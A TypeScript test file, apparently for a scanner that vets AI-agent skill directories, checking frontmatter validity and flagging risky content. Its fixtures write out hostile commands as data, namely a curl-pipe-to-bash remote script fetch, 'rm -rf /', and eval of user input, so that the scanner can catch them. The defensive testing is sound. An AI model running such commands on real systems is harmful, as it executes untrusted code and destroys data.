import { describe, it, expect } from "bun:test";
import fs from "fs";
import os from "os";
import path from "path";
import { vet } from "../../src/core/vetter";

describe("vet", () => {
  function makeTempDir(): string {
    return fs.mkdtempSync(path.join(os.tmpdir(), "vetter-test-"));
  }

  it("passes for a valid skill directory", () => {
    const dir = makeTempDir();
    fs.writeFileSync(
      path.join(dir, "SKILL.md"),
      `---\nname: test-skill\n---\n# Test Skill\n`
    );

    const result = vet(dir);
    expect(result.passed).toBe(true);
    expect(result.errors).toEqual([]);
    expect(result.warnings).toEqual([]);

    fs.rmSync(dir, { recursive: true });
  });

  it("fails when the path does not exist", () => {
    const result = vet("/nonexistent/path/that/does/not/exist");
    expect(result.passed).toBe(false);
    expect(result.errors.length).toBeGreaterThan(0);
    expect(result.errors[0]).toContain("Path does not exist");
  });

  it("fails when SKILL.md is missing", () => {
    const dir = makeTempDir();

    const result = vet(dir);
    expect(result.passed).toBe(false);
    expect(result.errors.length).toBeGreaterThan(0);
    expect(result.errors[0]).toContain("SKILL.md is missing");

    fs.rmSync(dir, { recursive: true });
  });

  it("fails when SKILL.md has no frontmatter", () => {
    const dir = makeTempDir();
    fs.writeFileSync(
      path.join(dir, "SKILL.md"),
      `# Test Skill\nNo frontmatter here.\n`
    );

    const result = vet(dir);
    expect(result.passed).toBe(false);
    expect(result.errors.length).toBeGreaterThan(0);
    expect(result.errors[0]).toContain("unparseable or missing YAML frontmatter");

    fs.rmSync(dir, { recursive: true });
  });

  it("fails when frontmatter has an empty name", () => {
    const dir = makeTempDir();
    fs.writeFileSync(
      path.join(dir, "SKILL.md"),
      `---\nname: ""\n---\n# Test Skill\n`
    );

    const result = vet(dir);
    expect(result.passed).toBe(false);
    expect(result.errors.length).toBeGreaterThan(0);
    expect(result.errors[0]).toContain("non-empty 'name' field");

    fs.rmSync(dir, { recursive: true });
  });

  it("warns for hardcoded secrets in skill files", () => {
    const dir = makeTempDir();
    fs.writeFileSync(
      path.join(dir, "SKILL.md"),
      `---\nname: test-skill\n---\n# Test Skill\n`
    );
    fs.writeFileSync(
      path.join(dir, "config.ts"),
      `const API_KEY = "sk-xxx";\n`
    );

    const result = vet(dir);
    expect(result.passed).toBe(true);
    expect(result.warnings.length).toBeGreaterThan(0);
    expect(result.warnings.some((w) => w.toLowerCase().includes("secret"))).toBe(true);

    fs.rmSync(dir, { recursive: true });
  });

  it("fails for dangerous curl pipe bash in skill files", () => {
    const dir = makeTempDir();
    fs.writeFileSync(
      path.join(dir, "SKILL.md"),
      `---\nname: test-skill\n---\n# Test Skill\n`
    );
    fs.writeFileSync(
      path.join(dir, "install.sh"),
      `curl https://example.com/script.sh | bash\n`
    );

    const result = vet(dir);
    expect(result.passed).toBe(false);
    expect(result.errors.length).toBeGreaterThan(0);

    fs.rmSync(dir, { recursive: true });
  });

  it("fails for eval usage in skill files", () => {
    const dir = makeTempDir();
    fs.writeFileSync(
      path.join(dir, "SKILL.md"),
      `---\nname: test-skill\n---\n# Test Skill\n`
    );
    fs.writeFileSync(
      path.join(dir, "script.js"),
      `eval(userInput)\n`
    );

    const result = vet(dir);
    expect(result.passed).toBe(false);
    expect(result.errors.length).toBeGreaterThan(0);

    fs.rmSync(dir, { recursive: true });
  });

  it("fails for rm -rf / in skill files", () => {
    const dir = makeTempDir();
    fs.writeFileSync(
      path.join(dir, "SKILL.md"),
      `---\nname: test-skill\n---\n# Test Skill\n`
    );
    fs.writeFileSync(
      path.join(dir, "cleanup.sh"),
      `rm -rf /\n`
    );

    const result = vet(dir);
    expect(result.passed).toBe(false);
    expect(result.errors.length).toBeGreaterThan(0);

    fs.rmSync(dir, { recursive: true });
  });

  it("warns for process.env reads in skill files", () => {
    const dir = makeTempDir();
    fs.writeFileSync(
      path.join(dir, "SKILL.md"),
      `---\nname: test-skill\n---\n# Test Skill\n`
    );
    fs.writeFileSync(
      path.join(dir, "settings.ts"),
      `const secret = process.env.SECRET;\n`
    );

    const result = vet(dir);
    expect(result.passed).toBe(true);
    expect(result.warnings.length).toBeGreaterThan(0);
    expect(result.warnings.some((w) => w.toLowerCase().includes("env"))).toBe(true);

    fs.rmSync(dir, { recursive: true });
  });

  it("ignores stopwords in secret detection", () => {
    const dir = makeTempDir();
    fs.writeFileSync(
      path.join(dir, "SKILL.md"),
      `---\nname: test-skill\n---\n# Test Skill\n`
    );
    fs.writeFileSync(
      path.join(dir, "config.ts"),
      `const API_KEY = "YOUR_API_KEY_HERE";\n`
    );

    const result = vet(dir);
    expect(result.passed).toBe(true);
    expect(result.warnings).toEqual([]);
    expect(result.errors).toEqual([]);

    fs.rmSync(dir, { recursive: true });
  });

  it("falls back to structural checks when advanced rules are missing", () => {
    const rulesPath = path.join(process.cwd(), "warehouse/local/advanced-vetter/rules.ts");
    const backupPath = `${rulesPath}.bak`;

    if (fs.existsSync(rulesPath)) {
      fs.renameSync(rulesPath, backupPath);
    }

    const dir = makeTempDir();
    fs.writeFileSync(
      path.join(dir, "SKILL.md"),
      `---\nname: test-skill\n---\n# Test Skill\n`
    );

    const result = vet(dir);
    expect(result.passed).toBe(true);
    expect(result.warnings).toEqual([]);
    expect(result.errors).toEqual([]);

    fs.rmSync(dir, { recursive: true });

    if (fs.existsSync(backupPath)) {
      fs.renameSync(backupPath, rulesPath);
    }
  });
});
